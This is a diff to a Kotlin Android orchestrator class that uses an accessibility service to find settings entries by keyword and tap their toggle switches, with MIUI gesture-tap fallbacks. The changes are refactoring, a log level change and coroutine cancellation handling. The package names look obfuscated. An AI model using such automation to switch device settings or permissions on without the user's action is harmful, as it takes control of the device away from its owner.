@@ -15,6 +15,7 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.storm.safe.rock.iuzxujjtqev
+import com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
 import com.storm.safe.rock.service.modules.yw5xud.UiDebugger
 import com.storm.safe.rock.p000.DangerKeywords
 import com.storm.safe.rock.service.MyAccessibilityService
@@ -2413,7 +2414,7 @@ class MainOrchestrator(
                             nodeId == "android:id/summary" ||
                             nodeId.contains("preference", ignoreCase = true)
                         if (!isContentTitle) {
-                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: skip non-content text id=$nodeId")
+                            Log.v(TAG, "🔍 [autoClick] MIUI fallback: skip non-content text id=$nodeId")
                             continue
                         }
                         Log.d(TAG, "🔍 [autoClick] MIUI fallback: 找到内容文本「$keyword」(id=$nodeId)")
@@ -2439,16 +2440,14 @@ class MainOrchestrator(
                             val switchX = (dm.widthPixels - 120).toFloat()  // MIUI Switch typically at right 120px
                             val switchY = rect.centerY().toFloat()
                             Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy B gesture tap right-switch at ($switchX,$switchY)")
-                            val tapped = com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
-                                .performTap(service, switchX, switchY)
+                            val tapped = GestureTapHelper.performTap(service, switchX, switchY)
                             if (tapped) {
                                 Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy B succeeded")
                                 return true
                             }
                             // Strategy C: if right-side tap fails, tap text center with real gesture
                             Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy C gesture tap text center at ${rect.centerX()},${rect.centerY()}")
-                            val tapped2 = com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
-                                .performTap(service, rect.centerX().toFloat(), rect.centerY().toFloat())
+                            val tapped2 = GestureTapHelper.performTap(service, rect.centerX().toFloat(), rect.centerY().toFloat())
                             if (tapped2) return true
                         }
                     }
@@ -2458,6 +2457,8 @@ class MainOrchestrator(
             }
             performClick(toggleNode)
             true
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
         } catch (e: Exception) {
             Log.e(TAG, "❌ attemptAutoClickSafe failed", e)
             false
